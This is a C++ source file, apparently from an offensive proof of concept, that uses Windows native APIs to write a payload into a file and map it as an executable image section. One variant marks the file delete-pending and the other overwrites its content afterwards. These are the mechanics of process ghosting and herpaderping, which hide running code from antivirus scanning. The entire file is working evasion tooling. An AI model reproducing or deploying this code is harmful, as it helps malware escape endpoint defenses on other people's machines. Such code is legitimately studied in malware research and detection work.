#include "delete_pending_file.h"

#include <iostream>
#include <stdio.h>

#include "ntddk.h"
#include "util.h"

#include "pe_hdrs_helper.h"
#pragma comment(lib, "Ntdll.lib")

HANDLE open_file(wchar_t* filePath)
{
    // convert to NT path
    std::wstring nt_path = L"\\??\\" + std::wstring(filePath);

    UNICODE_STRING file_name = { 0 };
    RtlInitUnicodeString(&file_name, nt_path.c_str());

    OBJECT_ATTRIBUTES attr = { 0 };
    InitializeObjectAttributes(&attr, &file_name, OBJ_CASE_INSENSITIVE, NULL, NULL);

    IO_STATUS_BLOCK status_block = { 0 };
    HANDLE file = INVALID_HANDLE_VALUE;
    NTSTATUS stat = NtOpenFile(
        &file,
        DELETE | SYNCHRONIZE | GENERIC_READ | GENERIC_WRITE,
        &attr,
        &status_block,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        FILE_SUPERSEDE | FILE_SYNCHRONOUS_IO_NONALERT
    );
    if (!NT_SUCCESS(stat)) {
        std::cout << "Failed to open, status: " << std::hex << stat << std::endl;
        return INVALID_HANDLE_VALUE;
    }
    return file;
}

HANDLE make_section_from_delete_pending_file(wchar_t* filePath, BYTE* payladBuf, DWORD payloadSize)
{
    HANDLE hDelFile = open_file(filePath);
    if (!hDelFile || hDelFile == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to create file" << std::dec << GetLastError() << std::endl;
        return INVALID_HANDLE_VALUE;
    }
    NTSTATUS status = 0;
    IO_STATUS_BLOCK status_block = { 0 };

    /* Set disposition flag */
    FILE_DISPOSITION_INFORMATION info = { 0 };
    info.DeleteFile = TRUE;

    status = NtSetInformationFile(hDelFile, &status_block, &info, sizeof(info), FileDispositionInformation);
    if (!NT_SUCCESS(status)) {
        std::cout << "Setting information failed: " << std::hex << status << "\n";
        return INVALID_HANDLE_VALUE;
    }
    std::cout << "[*] File disposition information set\n";

    LARGE_INTEGER ByteOffset = { 0 };

    status = NtWriteFile(
        hDelFile,
        NULL,
        NULL,
        NULL,
        &status_block,
        payladBuf,
        payloadSize,
        &ByteOffset,
        NULL
    );
    if (!NT_SUCCESS(status)) {
        DWORD err = GetLastError();
        std::cerr << "Failed writing payload! Error: " << std::hex << err << std::endl;
        return INVALID_HANDLE_VALUE;
    }
    
    HANDLE hSection = nullptr;
    status = NtCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        NULL,
        0,
        PAGE_READONLY,
        SEC_IMAGE,
        hDelFile
    );
    if (status != STATUS_SUCCESS) {
        std::cerr << "NtCreateSection failed: " << std::hex << status << std::endl;
        return INVALID_HANDLE_VALUE;
    }
    NtClose(hDelFile);
    hDelFile = nullptr;

    return hSection;
}


void ClearContent(HANDLE hTargetFile) {

    // overwrite the payload
    printf("[+] Overwriting file content\n");

    // replace with whitespace
    const char* data = "\x0A";
    DWORD dwTargetAux, dwTargetOriginalSize, dwTargetFileSize = GetFileSize(hTargetFile, &dwTargetAux) - 4;
    DWORD bytesRemaining = dwTargetFileSize - sizeof(data);

    SetFilePointer(hTargetFile, 0, NULL, 0);
    while (bytesRemaining > sizeof(data)) {
        DWORD bytesWritten;
        WriteFile(hTargetFile, data, sizeof(data), &bytesWritten, NULL);
        SetFilePointer(hTargetFile, 0, NULL, 1);
        bytesRemaining = bytesRemaining - bytesWritten;
    }


    return;
}


HANDLE make_section_from_overwrite_file(wchar_t* filePath, BYTE* payladBuf, DWORD payloadSize)
{
    HANDLE hOverwriteFile = open_file(filePath);
    if (!hOverwriteFile || hOverwriteFile == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to create file" << std::dec << GetLastError() << std::endl;
        return INVALID_HANDLE_VALUE;
    }
    NTSTATUS status = 0;
    IO_STATUS_BLOCK status_block = { 0 };

    LARGE_INTEGER ByteOffset = { 0 };

    status = NtWriteFile(
        hOverwriteFile,
        NULL,
        NULL,
        NULL,
        &status_block,
        payladBuf,
        payloadSize,
        &ByteOffset,
        NULL
    );
    if (!NT_SUCCESS(status)) {
        DWORD err = GetLastError();
        std::cerr << "Failed writing payload! Error: " << std::hex << err << std::endl;
        return INVALID_HANDLE_VALUE;
    }

    HANDLE hSection = nullptr;
    status = NtCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        NULL,
        0,
        PAGE_READONLY,
        SEC_IMAGE,
        hOverwriteFile
    );
    if (status != STATUS_SUCCESS) {
        std::cerr << "NtCreateSection failed: " << std::hex << status << std::endl;
        return INVALID_HANDLE_VALUE;
    }
    ClearContent(hOverwriteFile);
    NtClose(hOverwriteFile);
    hOverwriteFile = nullptr;

    return hSection;
}
